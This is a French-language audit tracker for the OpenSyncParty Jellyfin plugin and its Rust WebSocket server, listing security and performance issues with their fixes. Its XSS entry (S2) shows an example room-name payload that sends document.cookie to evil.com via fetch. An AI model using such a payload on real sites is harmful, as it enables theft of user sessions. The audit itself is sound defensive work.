# OpenSyncParty - Audit Issues Tracker

> Audit réalisé le 2026-01-08
>
> Ce document recense tous les problèmes identifiés lors de l'audit de performance et de sécurité.

---

## Légende

- **Priorité**: `P0` Critique | `P1` Élevée | `P2` Moyenne | `P3` Faible
- **Type**: `SEC` Sécurité | `PERF` Performance
- **Effort**: `S` Small (< 1h) | `M` Medium (1-4h) | `L` Large (> 4h)
- **Statut**: `[ ]` À faire | `[x]` Terminé | `[~]` En cours

---

## Problèmes de Sécurité

### S1 - Absence totale d'authentification
- [x] **Corrigé** (2026-01-08)
- **Priorité**: `P0` | **Effort**: `M`
- **Fichiers**: `session-server-rust/src/ws.rs`, `session-server-rust/src/main.rs`
- **CVSS**: 9.1 (Critical)

**Description**:
Le serveur WebSocket accepte toutes les connexions sans aucune vérification. Le système JWT est configuré dans le plugin C# (`PluginConfiguration.cs`) mais jamais utilisé côté serveur Rust.

**Code problématique** (`main.rs:22-24`):
```rust
ws.on_upgrade(move |socket| ws::client_connection(socket, clients, rooms))
// Aucune vérification de token avant d'accepter la connexion
```

**Impact**:
- N'importe qui peut rejoindre n'importe quelle room
- Usurpation d'identité possible
- Contrôle non autorisé de la lecture

**Solution proposée**:
1. Générer un JWT côté plugin Jellyfin lors de la connexion
2. Passer le token en query param ou header lors du handshake WebSocket
3. Valider le JWT dans le serveur Rust avant d'accepter la connexion
4. Extraire l'user_id du token pour l'associer au client

---

### S2 - Vulnérabilité XSS (Cross-Site Scripting)
- [x] **Corrigé** (2026-01-08)
- **Priorité**: `P0` | **Effort**: `S`
- **Fichiers**: `clients/web-plugin/osp-ui.js`
- **CVSS**: 8.1 (High)

**Description**:
Les noms de rooms sont injectés directement dans le HTML via `innerHTML` sans échappement.

**Code problématique** (`osp-ui.js:65`):
```javascript
item.innerHTML = `<div style="font-weight:bold">${room.name}</div>...`;
```

**Code problématique** (`osp-ui.js:104`):
```javascript
<div style="font-weight:600;font-size:16px;">${room.name}</div>
```

**Exploitation**:
Un attaquant crée une room nommée:
```
<img src=x onerror="fetch('https://evil.com/steal?cookie='+document.cookie)">
```

**Impact**:
- Vol de cookies/tokens de session Jellyfin
- Exécution de code JavaScript arbitraire
- Prise de contrôle du compte utilisateur

**Solution proposée**:
Créer une fonction d'échappement et l'utiliser systématiquement:
```javascript
const escapeHtml = (str) => {
  const div = document.createElement('div');
  div.textContent = str;
  return div.innerHTML;
};
// Puis: ${escapeHtml(room.name)}
```

---

### S3 - Pas de validation CORS
- [x] **Corrigé** (2026-01-08)
- **Priorité**: `P0` | **Effort**: `S`
- **Fichiers**: `session-server-rust/src/main.rs`
- **CVSS**: 7.5 (High)

**Description**:
Le serveur WebSocket n'a aucune politique CORS configurée. Il accepte les connexions de n'importe quelle origine.

**Code problématique** (`main.rs:26-27`):
```rust
// Aucun middleware CORS
warp::serve(ws_route).run(([0, 0, 0, 0], 3000)).await;
```

**Impact**:
- Un site malveillant peut se connecter au serveur WebSocket
- Attaques CSRF sur les actions de room
- Fuite de données cross-origin

**Solution proposée**:
```rust
use warp::Filter;

let cors = warp::cors()
    .allow_origins(vec!["https://your-jellyfin-server.com"])
    .allow_methods(vec!["GET", "POST"])
    .allow_headers(vec!["content-type"]);

let ws_route = warp::path("ws")
    .and(warp::ws())
    // ...
    .with(cors);
```

---

### S4 - JwtSecret vide par défaut
- [x] **Corrigé** (2026-01-08)
- **Priorité**: `P1` | **Effort**: `S`
- **Fichiers**: `plugins/jellyfin/OpenSyncParty/Configuration/PluginConfiguration.cs`

**Description**:
Le secret JWT est une chaîne vide par défaut.

**Code problématique** (`PluginConfiguration.cs:7`):
```csharp
public string JwtSecret { get; set; } = string.Empty;
```

**Impact**:
- Si JWT implémenté sans changer le secret, tokens facilement forgés
- Contournement complet de l'authentification

**Solution proposée**:
```csharp
public string JwtSecret { get; set; } = Guid.NewGuid().ToString("N") + Guid.NewGuid().ToString("N");
```
Ou générer au premier lancement et persister.

---

### S5 - Pas de rate limiting
- [x] **Corrigé** (2026-01-08)
- **Priorité**: `P1` | **Effort**: `M`
- **Fichiers**: `session-server-rust/src/ws.rs`

**Description**:
Un client peut envoyer un nombre illimité de messages par seconde.

**Impact**:
- DoS du serveur par flood de messages
- Spam des autres participants
- Consommation excessive de ressources

**Solution proposée**:
Implémenter un token bucket par client:
```rust
struct RateLimiter {
    tokens: u32,
    max_tokens: u32,
    refill_rate: u32, // tokens per second
    last_refill: Instant,
}

impl RateLimiter {
    fn try_consume(&mut self) -> bool {
        self.refill();
        if self.tokens > 0 {
            self.tokens -= 1;
            true
        } else {
            false
        }
    }
}
```

---

### S6 - Pas de limite de rooms/clients
- [x] **Corrigé** (2026-01-08)
- **Priorité**: `P1` | **Effort**: `S`
- **Fichiers**: `session-server-rust/src/ws.rs`

**Description**:
Aucune limite sur le nombre de rooms ou clients simultanés.

**Code concerné** (`ws.rs:121-134`):
```rust
// Création de room sans vérification de limite
locked_rooms.insert(room_id.clone(), room.clone());
```

**Impact**:
- Épuisement mémoire par création massive de rooms
- DoS par accumulation de connexions

**Solution proposée**:
```rust
const MAX_ROOMS: usize = 100;
const MAX_CLIENTS: usize = 1000;
const MAX_CLIENTS_PER_ROOM: usize = 50;

// Avant création:
if locked_rooms.len() >= MAX_ROOMS {
    send_error(client_id, "Too many active rooms");
    return;
}
```

---

### S7 - Pas de validation des payloads
- [ ] **À corriger**
- **Priorité**: `P2` | **Effort**: `S`
- **Fichiers**: `session-server-rust/src/ws.rs`

**Description**:
Les valeurs `position` et `play_state` ne sont pas validées.

**Code problématique** (`ws.rs:252-254`):
```rust
if let Some(pos) = payload.get("position").and_then(|v| v.as_f64()) {
    room.state.position = pos; // Aucune validation
}
```

**Impact**:
- Position négative ou NaN corrompt l'état
- Valeurs extrêmes causent des comportements imprévisibles

**Solution proposée**:
```rust
if let Some(pos) = payload.get("position").and_then(|v| v.as_f64()) {
    if pos.is_finite() && pos >= 0.0 && pos <= 86400.0 { // Max 24h
        room.state.position = pos;
    }
}

if let Some(st) = payload.get("play_state").and_then(|v| v.as_str()) {
    if st == "playing" || st == "paused" {
        room.state.play_state = st.to_string();
    }
}
```

---

### S8 - Logs contenant des données sensibles
- [ ] **À corriger**
- **Priorité**: `P2` | **Effort**: `S`
- **Fichiers**: `session-server-rust/src/ws.rs`

**Description**:
Les messages WebSocket complets sont loggés.

**Code problématique** (`ws.rs:93`):
```rust
println!("[server] Received from {}: {}", client_id, msg_str);
```

**Impact**:
- Fuite de données utilisateur dans les logs
- Tokens potentiellement exposés
- Non-conformité RGPD

**Solution proposée**:
```rust
// Logger uniquement le type de message
if let Ok(parsed) = serde_json::from_str::<WsMessage>(msg_str) {
    log::debug!("[server] {} -> {}", client_id, parsed.msg_type);
}
```

---

### S9 - WebSocket non sécurisé possible
- [ ] **À corriger**
- **Priorité**: `P2` | **Effort**: `S`
- **Fichiers**: `clients/web-plugin/osp-state.js`

**Description**:
Le protocole WebSocket suit celui de la page (ws:// si HTTP).

**Code concerné** (`osp-state.js:5,15`):
```javascript
const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
DEFAULT_WS_URL: `${protocol}//${host}:3000/ws`,
```

**Impact**:
- Interception possible sur réseaux non sécurisés
- Données de synchronisation exposées

**Solution proposée**:
- Forcer WSS en production
- Ou afficher un avertissement si ws:// est utilisé

---

### S10 - Pas de validation du media_id
- [ ] **À corriger**
- **Priorité**: `P3` | **Effort**: `M`
- **Fichiers**: `session-server-rust/src/ws.rs`

**Description**:
Le `media_id` fourni n'est pas validé contre les droits d'accès Jellyfin.

**Impact**:
- Un utilisateur pourrait référencer un média auquel il n'a pas accès

**Solution proposée**:
Valider via l'API Jellyfin que l'utilisateur a accès au média.

---

### S11 - Erreurs JSON silencieuses
- [ ] **À corriger**
- **Priorité**: `P3` | **Effort**: `S`
- **Fichiers**: `session-server-rust/src/ws.rs`

**Code problématique** (`ws.rs:97-100`):
```rust
Err(e) => {
    eprintln!("[server] JSON error: {}", e);
    return; // Erreur silencieuse côté client
}
```

**Solution proposée**:
Renvoyer un message d'erreur au client:
```rust
send_to_client(client_id, &locked_clients, &WsMessage {
    msg_type: "error".to_string(),
    payload: Some(json!({"message": "Invalid message format"})),
    // ...
});
```

---

## Problèmes de Performance

### P1 - Chargement séquentiel des scripts
- [ ] **À corriger**
- **Priorité**: `P2` | **Effort**: `M`
- **Fichiers**: `clients/web-plugin/plugin.js`

**Description**:
Les 6 scripts JS sont chargés séquentiellement.

**Code problématique** (`plugin.js:35`):
```javascript
scripts.reduce((p, src) => p.then(() => loadScript(src)), Promise.resolve())
```

**Impact**:
- Latence de ~300-600ms au démarrage
- Blocage du rendu

**Solution proposée**:
Option A - Bundler les scripts avec esbuild/rollup:
```bash
esbuild osp-*.js --bundle --outfile=osp-bundle.js
```

Option B - Charger en parallèle avec dépendances:
```javascript
// Charger state et utils en premier (pas de dépendances)
await Promise.all([loadScript('osp-state.js'), loadScript('osp-utils.js')]);
// Puis le reste en parallèle
await Promise.all([loadScript('osp-ui.js'), loadScript('osp-playback.js'), loadScript('osp-ws.js')]);
await loadScript('osp-app.js');
```

---

### P2 - Intervalles multiples sans coordination
- [x] **Corrigé** (2026-01-08)
- **Priorité**: `P1` | **Effort**: `M`
- **Fichiers**: `clients/web-plugin/osp-app.js`

**Description**:
4 timers indépendants tournent en permanence.

**Code problématique** (`osp-app.js:20-23`):
```javascript
setInterval(() => { ui.injectOsdButton(); if (utils.getVideo()) playback.bindVideo(); }, 1000);
setInterval(() => { if (state.ws && state.ws.readyState === 1) OSP.actions.send('ping', { client_ts: utils.nowMs() }); }, 3000);
setInterval(() => { ui.renderHomeWatchParties(); }, 2000);
setInterval(() => { playback.syncLoop(); }, 1000);
```

**Impact**:
- CPU actif en permanence (~5-10%)
- Batterie drainée sur mobile
- Wake-ups inutiles

**Solution proposée**:
```javascript
// Remplacer le polling par MutationObserver pour injectOsdButton
const observer = new MutationObserver(() => {
  if (document.querySelector('.videoOsdBottom .buttons')) {
    ui.injectOsdButton();
  }
  if (utils.getVideo()) playback.bindVideo();
});
observer.observe(document.body, { childList: true, subtree: true });

// Un seul timer unifié
let lastPing = 0;
let lastHomeRender = 0;
const mainLoop = () => {
  const now = Date.now();

  if (now - lastPing >= 3000 && state.ws?.readyState === 1) {
    OSP.actions.send('ping', { client_ts: now });
    lastPing = now;
  }

  if (now - lastHomeRender >= 2000 && utils.isHomeView()) {
    ui.renderHomeWatchParties();
    lastHomeRender = now;
  }

  playback.syncLoop();

  requestAnimationFrame(mainLoop);
};
requestAnimationFrame(mainLoop);
```

---

### P3 - Reconstruction DOM complète à chaque render
- [ ] **À corriger**
- **Priorité**: `P2` | **Effort**: `L`
- **Fichiers**: `clients/web-plugin/osp-ui.js`

**Description**:
Le DOM est entièrement reconstruit toutes les 2 secondes.

**Code problématique** (`osp-ui.js:112-117`):
```javascript
section.innerHTML = `
  <div style="display:flex;...">
    <div style="font-weight:700;...">Watch Parties</div>
  </div>
  <div style="display:flex;...">${cards}</div>
`;
```

**Impact**:
- Reflows/repaints coûteux
- Perte de focus utilisateur
- Animations interrompues

**Solution proposée**:
Implémenter un diff minimal:
```javascript
const renderHomeWatchParties = () => {
  // ...
  const existingCards = new Map();
  section.querySelectorAll('.osp-room-card').forEach(card => {
    existingCards.set(card.dataset.roomId, card);
  });

  const newRoomIds = new Set(state.rooms.map(r => r.id));

  // Supprimer les cartes obsolètes
  existingCards.forEach((card, id) => {
    if (!newRoomIds.has(id)) card.remove();
  });

  // Mettre à jour ou créer les cartes
  state.rooms.forEach(room => {
    const existing = existingCards.get(room.id);
    if (existing) {
      // Mettre à jour le contenu si changé
      const countEl = existing.querySelector('.osp-room-count');
      if (countEl) countEl.textContent = `${room.count} participant${room.count > 1 ? 's' : ''}`;
    } else {
      // Créer nouvelle carte
      const card = createRoomCard(room);
      cardsContainer.appendChild(card);
    }
  });
};
```

---

### P4 - Fuites mémoire (event listeners)
- [x] **Corrigé** (2026-01-08)
- **Priorité**: `P1` | **Effort**: `M`
- **Fichiers**: `clients/web-plugin/osp-playback.js`

**Description**:
Les event listeners ne sont jamais nettoyés.

**Code problématique** (`osp-playback.js:97-156`):
```javascript
video.addEventListener('waiting', () => { state.isBuffering = true; });
video.addEventListener('canplay', () => { state.isBuffering = false; });
// ... 6 autres listeners
// Jamais de removeEventListener
```

**Impact**:
- Accumulation de listeners sur sessions longues
- Fuites mémoire progressives
- Comportement erratique avec plusieurs handlers

**Solution proposée**:
```javascript
let boundVideo = null;
const handlers = {};

const bindVideo = () => {
  const video = utils.getVideo();
  if (!video || video === boundVideo) return;

  // Nettoyer l'ancien binding
  if (boundVideo) unbindVideo();

  boundVideo = video;

  handlers.waiting = () => { state.isBuffering = true; };
  handlers.canplay = () => { state.isBuffering = false; };
  // ...

  Object.entries(handlers).forEach(([event, handler]) => {
    video.addEventListener(event, handler);
  });
};

const unbindVideo = () => {
  if (!boundVideo) return;
  Object.entries(handlers).forEach(([event, handler]) => {
    boundVideo.removeEventListener(event, handler);
  });
  boundVideo = null;
};
```

---

### P5 - Cache d'images sans limite
- [ ] **À corriger**
- **Priorité**: `P3` | **Effort**: `S`
- **Fichiers**: `clients/web-plugin/osp-ui.js`, `clients/web-plugin/osp-state.js`

**Description**:
Le cache `homeRoomCache` grandit indéfiniment.

**Code problématique** (`osp-state.js:45`):
```javascript
homeRoomCache: new Map(),
```

**Impact**:
- Croissance mémoire sur sessions longues
- Données obsolètes jamais évincées

**Solution proposée**:
Implémenter un LRU cache simple:
```javascript
class LRUCache {
  constructor(maxSize = 50) {
    this.maxSize = maxSize;
    this.cache = new Map();
  }

  get(key) {
    if (!this.cache.has(key)) return undefined;
    const value = this.cache.get(key);
    this.cache.delete(key);
    this.cache.set(key, value);
    return value;
  }

  set(key, value) {
    if (this.cache.has(key)) this.cache.delete(key);
    else if (this.cache.size >= this.maxSize) {
      this.cache.delete(this.cache.keys().next().value);
    }
    this.cache.set(key, value);
  }
}

// Usage:
homeRoomCache: new LRUCache(50),
```

---

### P6 - Mutex synchrone dans contexte async
- [x] **Corrigé** (2026-01-08)
- **Priorité**: `P0` | **Effort**: `M`
- **Fichiers**: `session-server-rust/src/main.rs`, `session-server-rust/src/ws.rs`

**Description**:
Utilisation de `std::sync::Mutex` dans un runtime async Tokio.

**Code problématique** (`main.rs:12-13`):
```rust
let clients: Clients = Arc::new(std::sync::Mutex::new(HashMap::new()));
let rooms: Rooms = Arc::new(std::sync::Mutex::new(HashMap::new()));
```

**Code problématique** (`ws.rs:103-104`):
```rust
let mut locked_rooms = rooms.lock().unwrap();
let mut locked_clients = clients.lock().unwrap();
```

**Impact**:
- Bloque le thread entier du runtime, pas juste la task
- Dégradation des performances sous charge
- Risque de deadlock

**Solution proposée**:
```rust
// types.rs
use tokio::sync::RwLock;

pub type Clients = Arc<RwLock<HashMap<String, Client>>>;
pub type Rooms = Arc<RwLock<HashMap<String, Room>>>;

// ws.rs
let locked_rooms = rooms.read().await;  // Pour lecture
let mut locked_rooms = rooms.write().await;  // Pour écriture
```

Note: Nécessite de propager `.await` dans tout le code utilisant les locks.

---

### P7 - Clone excessif pour broadcast
- [ ] **À corriger**
- **Priorité**: `P2` | **Effort**: `M`
- **Fichiers**: `session-server-rust/src/messaging.rs`

**Description**:
Le message WebSocket est cloné pour chaque client du broadcast.

**Code problématique** (`messaging.rs:42-49`):
```rust
let warp_msg = warp::ws::Message::text(json);
for client_id in &room.clients {
    // ...
    let _ = client.sender.send(Ok(warp_msg.clone()));
}
```

**Impact**:
- Allocations O(n) par message
- Pression sur le garbage collector

**Solution proposée**:
```rust
use bytes::Bytes;
use std::sync::Arc;

pub fn broadcast_to_room(room: &Room, clients: &HashMap<String, Client>, msg: &WsMessage, exclude: Option<&str>) {
    let json = serde_json::to_string(msg).unwrap();
    let shared_bytes: Arc<str> = Arc::from(json);

    for client_id in &room.clients {
        if Some(client_id.as_str()) == exclude { continue; }
        if let Some(client) = clients.get(client_id) {
            let msg_clone = warp::ws::Message::text(Arc::clone(&shared_bytes).to_string());
            let _ = client.sender.send(Ok(msg_clone));
        }
    }
}
```

Alternative: Utiliser `Bytes` pour zero-copy.

---

### P8 - Logs verbeux en production
- [ ] **À corriger**
- **Priorité**: `P2` | **Effort**: `S`
- **Fichiers**: `session-server-rust/src/ws.rs`

**Description**:
Chaque message WebSocket est loggé intégralement.

**Code problématique** (`ws.rs:93`):
```rust
println!("[server] Received from {}: {}", client_id, msg_str);
```

**Impact**:
- I/O disque excessive
- Logs volumineux
- Ralentissement sous charge

**Solution proposée**:
```rust
// Cargo.toml - déjà présent
// log = "0.4"
// env_logger = "0.10"

// main.rs
env_logger::Builder::from_env(
    env_logger::Env::default().default_filter_or("info")
).init();

// ws.rs
log::debug!("[server] {} -> {}", client_id, parsed.msg_type);
log::trace!("[server] Full message: {}", msg_str);
```

En production, lancer avec `RUST_LOG=info`.

---

### P9 - Pas de détection des connexions zombies
- [ ] **À corriger**
- **Priorité**: `P2` | **Effort**: `M`
- **Fichiers**: `session-server-rust/src/ws.rs`

**Description**:
Le serveur ne détecte pas les clients déconnectés brutalement (sans close frame).

**Impact**:
- Ressources maintenues pour des clients morts
- Compteur de participants incorrect
- Rooms "fantômes"

**Solution proposée**:
```rust
// Ajouter un timestamp de dernier ping dans Client
pub struct Client {
    pub sender: mpsc::UnboundedSender<...>,
    pub room_id: Option<String>,
    pub last_seen: Instant,
}

// Mettre à jour lors de chaque message reçu
client.last_seen = Instant::now();

// Tâche de nettoyage périodique
tokio::spawn(async move {
    loop {
        tokio::time::sleep(Duration::from_secs(30)).await;
        let mut to_remove = Vec::new();
        {
            let clients = clients.read().await;
            for (id, client) in clients.iter() {
                if client.last_seen.elapsed() > Duration::from_secs(60) {
                    to_remove.push(id.clone());
                }
            }
        }
        for id in to_remove {
            handle_disconnect(&id, &clients, &rooms).await;
        }
    }
});
```

---

## Récapitulatif

| ID | Type | Priorité | Effort | Description |
|----|------|----------|--------|-------------|
| S1 | SEC | P0 | M | Absence d'authentification |
| S2 | SEC | P0 | S | Vulnérabilité XSS |
| S3 | SEC | P0 | S | Pas de CORS |
| P6 | PERF | P0 | M | Mutex synchrone en async |
| S4 | SEC | P1 | S | JwtSecret vide |
| S5 | SEC | P1 | M | Pas de rate limiting |
| S6 | SEC | P1 | S | Pas de limite rooms/clients |
| P2 | PERF | P1 | M | Intervalles multiples |
| P4 | PERF | P1 | M | Fuites mémoire (listeners) |
| S7 | SEC | P2 | S | Pas de validation payloads |
| S8 | SEC | P2 | S | Logs avec données sensibles |
| S9 | SEC | P2 | S | WebSocket non sécurisé |
| P1 | PERF | P2 | M | Chargement séquentiel JS |
| P3 | PERF | P2 | L | Reconstruction DOM |
| P7 | PERF | P2 | M | Clone excessif broadcast |
| P8 | PERF | P2 | S | Logs verbeux |
| P9 | PERF | P2 | M | Connexions zombies |
| S10 | SEC | P3 | M | Pas de validation media_id |
| S11 | SEC | P3 | S | Erreurs JSON silencieuses |
| P5 | PERF | P3 | S | Cache sans limite |

---

## Ordre de résolution recommandé

### Phase 1 - Critiques (avant toute mise en production)
1. [x] S2 - XSS (plus rapide à corriger, impact immédiat)
2. [x] S3 - CORS
3. [x] P6 - Mutex async
4. [x] S1 - Authentification JWT

### Phase 2 - Élevées
5. [x] S4 - JwtSecret (warning au démarrage)
6. [x] S5 - Rate limiting (30 msg/sec)
7. [x] S6 - Limites rooms/clients (3 rooms/user, 20 clients/room)
8. [x] P2 - Intervalles (optimisés et conditionnels)
9. [x] P4 - Fuites mémoire (cleanup listeners)

### Phase 3 - Moyennes
10. [ ] S7 - Validation payloads
11. [ ] P1 - Bundle JS
12. [ ] P8 - Logs
13. [ ] P9 - Connexions zombies

### Phase 4 - Faibles
14. [ ] S8 - Logs sensibles
15. [ ] S9 - WSS
16. [ ] P3 - Diff DOM
17. [ ] P5 - LRU cache
18. [ ] P7 - Clone broadcast
19. [ ] S10 - Validation media_id
20. [ ] S11 - Erreurs JSON

---

## Notes de suivi

> Ajouter ici les notes au fur et à mesure de la résolution.

### 2026-01-08
- Création du document d'audit
- 20 problèmes identifiés (11 sécurité, 9 performance)
- 4 problèmes critiques P0
- **S2 corrigé** : Ajout de `escapeHtml()` dans `osp-utils.js`, utilisé dans `osp-ui.js` pour échapper `room.name`, `room.id`, `room.media_id`, et `state.roomName`
- **S3 corrigé** : Ajout de validation Origin pour WebSocket et CORS pour `/health`. Variable d'environnement `ALLOWED_ORIGINS` (défaut: `localhost:8096`)
- **P6 corrigé** : Migration de `std::sync::Mutex` vers `tokio::sync::RwLock`. Toutes les fonctions utilisant les locks sont maintenant async avec `.read().await` / `.write().await`
- **S1 corrigé** : Authentification JWT complète - génération token côté plugin C#, validation côté serveur Rust, transmission via query param WebSocket
- **S4 corrigé** : Warning au démarrage du plugin si JwtSecret non configuré ou trop court (< 32 chars)
- **S5 corrigé** : Rate limiting 30 messages/seconde par client avec compteur glissant
- **S6 corrigé** : Limite 3 rooms par utilisateur, 20 clients par room
- **P2 corrigé** : Intervalles optimisés (ping 10s, home refresh 5s, sync 500ms). Exécution conditionnelle (sync loop seulement si en room et non-host)
- **P4 corrigé** : Tracking des listeners vidéo pour cleanup. Nettoyage automatique quand l'élément vidéo change. Fonction `cleanup()` exportée
